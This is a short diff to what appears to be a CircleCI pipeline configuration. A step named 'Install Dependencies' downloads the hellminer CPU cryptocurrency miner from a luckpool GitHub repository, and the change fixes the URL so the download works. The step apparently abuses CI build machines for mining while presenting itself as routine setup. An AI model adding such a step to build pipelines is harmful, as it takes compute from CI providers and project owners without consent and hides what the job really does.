@@ -27,7 +27,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://github.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz
+            command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 workflows:
     version: 2.1
     build:
